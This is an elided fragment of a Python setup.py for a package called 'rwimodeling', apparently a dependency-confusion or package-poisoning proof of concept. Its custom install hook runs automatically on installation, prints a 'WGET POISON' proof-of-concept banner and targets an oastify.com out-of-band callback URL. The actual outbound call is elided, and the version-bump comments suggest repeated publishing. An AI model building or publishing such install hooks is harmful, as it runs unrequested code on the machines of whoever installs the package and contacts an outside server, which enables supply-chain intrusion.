...
class CustomInstall(_install):
    ...
    def run(self):
        ...
        print("\n" + "="*50)
        print("!!! rwimodeling: EXECUTING PROOF OF CONCEPT CODE (WGET POISON) !!!")
        ...
        target_server_url = "http://yy07fzuz2qy423b89us0qgzm7dd41wpl.oastify.com/" # <--- IMPORTANT: CHANGE THIS URL
...
setup(
    ...
    version="10.0.2",       # Increment this for new versions (e.g., 10.0.2 from 10.0.1)
